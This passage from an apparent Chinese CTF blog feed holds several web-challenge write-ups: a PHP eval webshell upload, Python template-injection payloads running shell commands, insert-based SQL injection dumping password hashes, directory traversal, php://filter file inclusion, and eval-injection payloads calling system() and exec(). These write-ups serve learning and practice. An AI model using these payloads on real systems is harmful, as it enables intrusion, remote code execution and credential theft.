        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from cetc007.user where id='$id'"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> False<span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br >something wae wrong ! &lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"id: "</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"name:"</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
     <span class="token delimiter">?></span></code></pre>
<ul>
<li>floatval（$ _ GET [id]）！==‘1’ //浮点不为1</li>
<li>substr（$ _ GET [id]，-1）===’9‘ //id最后一位为9</li>
</ul>
<pre><code>?page=1&amp;id=1–9&amp;submit=提交查询#</code></pre>
<ul>
<li>chdir(‘uploaded’)//修改上传目录到uploaded下</li>
</ul>
<p>POST:</p>
<pre><code> con=&lt;?php @eval($_POST['a']);?&gt;&amp;file=../1.php/.</code></pre>
<p>蚁剑连接：</p>
<p><img src="/2021/10/21/xctf-web-ics/6.png" alt="6"></p>
]]></content>
  </entry>
  <entry>
    <title>XCTF：Web_python_template_injection</title>
    <url>/2021/10/21/xctf-web-python-template-injection/</url>
    <content><![CDATA[<pre><code>instance.__class__ 可以获取当前实例的类对象
class.__mro__ 获取当前类对象的所有继承类
__subclasses__()这个方法返回了类的所有存活的子类的引用
os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置</code></pre>
<h5 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h5><p>查看所有模块：</p>
<pre><code>{{''.__class__.__mro__[2].__subclasses__()}}</code></pre>
<p><img src="/2021/10/21/xctf-web-python-template-injection/1.png" alt="image-20211021124232805"></p>
<pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}</code></pre>
<p><img src="/2021/10/21/xctf-web-python-template-injection/2.png" alt="image-20211021124435199"></p>
<pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}</code></pre>
<h5 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h5><pre><code>{{[].__class__.__base__.__subclasses__()}}</code></pre>
<pre><code>{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}</code></pre>
<pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat fl4g").read()')}}</code></pre>
]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>bo1lers：2020-WelcomeToEarth</title>
    <url>/2021/08/10/bo1lers-2020-welcometoearth/</url>
    <content><![CDATA[<p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022223955.png" alt="image-20210812022223955"></p>
<p>然后直跳这个画面</p>
<p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022255600.png" alt="image-20210812022255600"></p>
<p>抓包</p>
<p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022433004.png" alt="image-20210812022433004"></p>
<pre class=" language-javascript"><code class="language-javascript"> document<span class="token punctuation">.</span>onkeydown <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        event <span class="token operator">=</span> event <span class="token operator">||</span> window<span class="token punctuation">.</span>event<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>keyCode <span class="token operator">==</span> <span class="token number">27</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/chase/"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>

      <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">dietimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">function</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
</code></pre>
<p>访问chase</p>
<p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022512230.png" alt="image-20210812022512230"></p>
<pre class=" language-javascript"><code class="language-javascript">      <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">dietimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">function</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">function</span> <span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">function</span> <span class="token function">leftt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/leftt/"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">function</span> <span class="token function">right</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token function">dietimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>static/js/door.js</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">check_door</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> all_radio <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"door_form"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>elements<span class="token punctuation">;</span>
  <span class="token keyword">var</span> guess <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> all_radio<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>all_radio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>checked<span class="token punctuation">)</span> guess <span class="token operator">=</span> all_radio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>

  rand <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>rand <span class="token operator">==</span> guess<span class="token punctuation">)</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/open/"</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>static/js/fight.js</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Run to scramble original flag</span>
<span class="token comment" spellcheck="true">//console.log(scramble(flag, action));</span>
<span class="token keyword">function</span> <span class="token function">scramble</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> key<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> n <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">%</span> flag<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    <span class="token keyword">let</span> temp <span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
    flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> flag<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">check_action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> action <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"{hey"</span><span class="token punctuation">,</span> <span class="token string">"_boy"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"s_im"</span><span class="token punctuation">,</span> <span class="token string">"ck!}"</span><span class="token punctuation">,</span> <span class="token string">"_baa"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"pctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// TODO: unscramble function</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> permutations

flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"{hey"</span><span class="token punctuation">,</span> <span class="token string">"_boy"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"s_im"</span><span class="token punctuation">,</span> <span class="token string">"ck!}"</span><span class="token punctuation">,</span> <span class="token string">"_baa"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"pctf"</span><span class="token punctuation">]</span>

item <span class="token operator">=</span> permutations<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> item<span class="token punctuation">:</span>
   k <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">if</span> k<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'pctf{hey_boys'</span><span class="token punctuation">)</span> <span class="token operator">and</span> k<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span></code></pre>
<p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812144644613.png" alt="image-20210812144644613"></p>
]]></content>
  </entry>
  <entry>
    <title>Zeropts:2020-CanYouGuessIt</title>
    <url>/2021/07/28/zeropts-2020-canyouguessit/</url>
    <content><![CDATA[<p><img src="/2021/07/28/zeropts-2020-canyouguessit/1.png" alt="1"></p>
<p>点击source</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// FLAG is defined in config.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<ul>
<li><h5 id="hash-equals-—-可防止时序攻击的字符串比较，无论它们是否相等，本函数的时间消耗是恒定的-相等时返回-true，否则返回-false。"><a href="#hash-equals-—-可防止时序攻击的字符串比较，无论它们是否相等，本函数的时间消耗是恒定的-相等时返回-true，否则返回-false。" class="headerlink" title="hash_equals — 可防止时序攻击的字符串比较，无论它们是否相等，本函数的时间消耗是恒定的,相等时返回 true，否则返回 false。"></a>hash_equals — 可防止时序攻击的字符串比较，无论它们是否相等，本函数的时间消耗是恒定的,相等时返回 true，否则返回 false。</h5></li>
<li><h5 id="basename-—-函数返回路径中的文件名部分。"><a href="#basename-—-函数返回路径中的文件名部分。" class="headerlink" title="basename() — 函数返回路径中的文件名部分。"></a>basename() — 函数返回路径中的文件名部分。</h5></li>
</ul>
<p>可以发现basename()可跨目录读文件</p>
<p><img src="/2021/07/28/zeropts-2020-canyouguessit/2.png" alt="2"></p>
<p>%81开始，basename就会忽略</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>http://url/index.php/config.php/%80?source</code></pre>
]]></content>
  </entry>
  <entry>
    <title>i春秋:Web-Blog</title>
    <url>/2021/05/18/i-chun-qiu-web-blog/</url>
    <content><![CDATA[<p><img src="/2021/05/18/i-chun-qiu-web-blog/af732d2efa39b352f28282731713236.png" alt="af732d2efa39b352f28282731713236"></p>
<p><img src="/2021/05/18/i-chun-qiu-web-blog/2f76efeb2524974afe648a1e5273c0c.png" alt="2f76efeb2524974afe648a1e5273c0c"></p>
<p>得到路径：  /kindeditor/php/upload_json.php</p>
<p> 知道编辑版为 kindeditor，搜索相关漏洞，得到利用</p>
<pre><code> /kindeditor/php/file_manager_json.php?path=/</code></pre>
<p>访问：</p>
<pre><code>/kindeditor/php/file_manager_json.php?path=../../ </code></pre>
<p><img src="/2021/05/18/i-chun-qiu-web-blog/d879bbe9821057bd315346509fae17e.png" alt="d879bbe9821057bd315346509fae17e"></p>
<p>尝试注入：</p>
<pre><code>title=1' and '1'='1  返回1 </code></pre>
<pre><code>title=1' and '1'='2  返回0 </code></pre>
<p> 了解到这是一个insert注入</p>
<p> insert into table(columns) values(A1,B1,C1)</p>
<p><img src="/2021/05/18/i-chun-qiu-web-blog/05e4af14c2cb7fff3f502993faf7a5a.png" alt="05e4af14c2cb7fff3f502993faf7a5a"></p>
<pre><code>title=p1&amp;content=1','1'),('aaa',(database()),'1</code></pre>
<pre><code>title=p2&amp;content=1','1'),('aaa',(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),'2</code></pre>
<pre><code>title=p3&amp;content=1','1'),('aaa',(SELECT group_concat(column_name) from information_schema.columns where table_name='users'),'3</code></pre>
<pre><code>title=p4&amp;content=1','1'),('aaa',(SELECT group_concat(password) from users),'4</code></pre>
<p>依次尝试结果如下：</p>
<p><img src="/2021/05/18/i-chun-qiu-web-blog/bdb25940d7171a3b6273fc98dc56960.png" alt="bdb25940d7171a3b6273fc98dc56960"></p>
<ul>
<li>dbb616c5d935d8f34c12c291066d6fb7</li>
<li>202cb962ac59075b964b07152d234b70</li>
<li>250cf8b51c773f3f8dc8b4be867a9a02</li>
<li>68053af2923e00204c3ca7c6a3150cf7</li>
</ul>
<p>解密为： melody123 123 456 789</p>
<p>访问admin melody123</p>
<pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=article_manage&amp;name=php</code></pre>
<p>可能存在文件包含</p>
<pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code></pre>
<p><img src="/2021/05/18/i-chun-qiu-web-blog/f7ec6bb8b94fba17307d1752a124d19.png" alt="f7ec6bb8b94fba17307d1752a124d19"></p>
<p>base64解码得到flag</p>
<p><img src="/2021/05/18/i-chun-qiu-web-blog/2325cb6cebbefed58516c4d5d1b3e80.png" alt="2325cb6cebbefed58516c4d5d1b3e80"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:MiscWeb-爆破</title>
    <url>/2021/04/07/i-chun-qiu-miscweb-bao-po/</url>
    <content><![CDATA[<h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h2><h4 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h4><p>flag在6位变量中</p>
<pre><code>&lt;?php
include "flag.php";
$a = @$_REQUEST['hello'];//以get或post传入hello，并赋值给`$a`
if(!preg_match('/^\w*$/',$a )){//正则表达式^匹配一行的开头，$表示结束。\w表示匹配包括下划线的任何单词字符，等价于'[A-Za-z0-9_]'。*号：匹配前面的子表达式零次或多次。
  die('ERROR');
}
eval("var_dump($$a);");
show_source(__FILE__);//__FILE__当前运行文件的完整路径和文件名。
?&gt;</code></pre>
<p>1、如果匹配正则表达式/^\w*$/，就打印变量 $$a<br>2、$a是hello，$$a是六位变量$hello<br>接下来不会了，所以百度一下<br>发现超全局变量$GLOBALS<br>作用：<br>引用全局作用域中可用的全部变量。这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。<br>3、所以在URL后加?hello=GLOBALS，将参数hello修改为Globals实际执行语句：</p>
<pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$a);"</span><span class="token punctuation">)</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($hello);"</span><span class="token punctuation">)</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($GLOBALS);"</span><span class="token punctuation">)</span></code></pre>
<p>得到flag</p>
<h2 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h2><h4 id="题目内容-1"><a href="#题目内容-1" class="headerlink" title="题目内容"></a>题目内容</h4><p>flag不在变量中</p>
<h4 id="法一：蚁剑连接"><a href="#法一：蚁剑连接" class="headerlink" title="法一：蚁剑连接"></a>法一：蚁剑连接</h4><pre><code>?hello=${@eval($_POST[1])</code></pre>
<p>访问flag.php</p>
<h4 id="法二：利用文件系统函数"><a href="#法二：利用文件系统函数" class="headerlink" title="法二：利用文件系统函数"></a>法二：利用文件系统函数</h4><h5 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h5><p><a href="http://php.net/manual/en/function.file.php"><code>file()</code></a> 函数用于将整个文件读入数组中。</p>
<p>尝试构造 payload </p>
<pre><code>?hello=file("flag.php")</code></pre>
<p>提交后直接看到 flag，证明推测正确</p>
<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=file(flag.php).png" alt="hello=file(flag.php)"></p>
<h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p><a href="http://php.net/manual/en/function.file-get-contents.php"><code>file_get_contents()</code></a> 函数用于将整个文件读入到一个字符串中。</p>
<p>尝试构造 payload</p>
<pre><code>?hello=file_get_contents("flag.php")</code></pre>
<p>提交后竟未显示 flag？这是因为 flag.php 文件中的内容以界定符 <code>&lt;?php</code> 开头，所以输出到浏览器时，该字符串被当做 PHP 脚本不予显示。但不必担心，右击页面空白处，查看网页源代码，即可看到 flag：</p>
<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=file_get_contents(flag.php).png" alt="hello=file_get_contents(flag.php)"></p>
<h5 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h5><p><a href="http://php.net/manual/en/function.show-source.php"><code>show_source()</code></a> 函数等同于 <a href="http://php.net/manual/en/function.highlight-file.php"><code>highlight_file()</code></a> 函数，可将一个 PHP 脚本文件语法高亮。</p>
<p>尝试构造 payload </p>
<pre><code>?hello=show_source("flag.php")</code></pre>
<p>提交后能看到语法高亮后的 flag：</p>
<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=show_source(flag.php).png" alt="hello=show_source(flag.php)"></p>
<h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p><a href="http://php.net/manual/en/function.readfile.php"><code>readfile()</code></a> 函数用于读取一个文件并写入到输出缓冲区。</p>
<p>在提交 payload </p>
<pre><code>?hello=readfile("flag.php")</code></pre>
<p> 在网页源代码处可看到 flag</p>
<h5 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h5><p><a href="http://php.net/manual/en/function.fread.php"><code>fread()</code></a> 函数用于读取二进制文件，不过首先得用 <a href="http://php.net/manual/en/function.fopen.php"><code>fopen()</code></a> 函数创建文件句柄，填入第一个参数，并在第二个参数中填入可读取的最大字节数。</p>
<p>因此，构造 payload </p>
<pre><code>?hello=fread(fopen("flag.php","r"),100)</code></pre>
<p>在网页源代码处可看到 flag</p>
<h4 id="法三：利用命令执行函数"><a href="#法三：利用命令执行函数" class="headerlink" title="法三：利用命令执行函数"></a>法三：利用命令执行函数</h4><p>利用 PHP 中的<a href="http://php.net/manual/en/ref.exec.php">命令执行函数</a>，通过执行系统命令以显示文件内容。</p>
<p>首先，由预定义常量 <a href="http://php.net/manual/en/reserved.constants.php"><code>PHP_OS</code></a> 可知后台操作系统的类型，构造 </p>
<pre><code>?hello=PHP_OS</code></pre>
<p> 提交后，发现是 Linux 操作系统：</p>
<p><img src="/2021/04/07/i-chun-qiu-miscweb-bao-po/blog/source_posts\i春秋：MiscWeb-爆破\hello=PHP_OS.png" alt="hello=PHP_OS"></p>
<h5 id="执行运算符"><a href="#执行运算符" class="headerlink" title="执行运算符"></a>执行运算符</h5><p>PHP 的<a href="http://php.net/manual/en/language.operators.execution.php">执行运算符</a>为反引号「`」，可将反引号之间的内容作为 shell 命令执行，并返回所有执行结果。</p>
<p>在构造 payload 之前，需要做两件事：</p>
<ul>
<li>闭合前面的 <code>var_dump(</code> 字符串。</li>
<li>注释后面的 <code>);</code> 字符串。</li>
</ul>
<p>因此，构造 payload </p>
<pre><code>hello=);echo `cat flag.php`;//</code></pre>
<p>在网页源代码处即可看到 flag</p>
<h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p><a href="http://php.net/manual/en/function.system.php"><code>system()</code></a> 函数用于执行外部程序，输出执行结果，并返回结果的最后一行。</p>
<p>因此，在提交 payload </p>
<pre><code>hello=);echo system("cat flag.php");//</code></pre>
<p>在网页源代码处可看到两个 flag，是因为第一个 flag 是由输出结果而得，第二个 flag 是由返回值而得</p>
<h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p><a href="http://php.net/manual/en/function.exec.php"><code>exec()</code></a> 函数用于执行一个外部程序，并返回结果的最后一行。</p>
<p>因此，在提交 payload </p>
<pre><code>hello=);echo exec("cat flag.php");//</code></pre>
<p>可见 flag，因此 flag 正好是 flag.php 文件中的最后一行：</p>
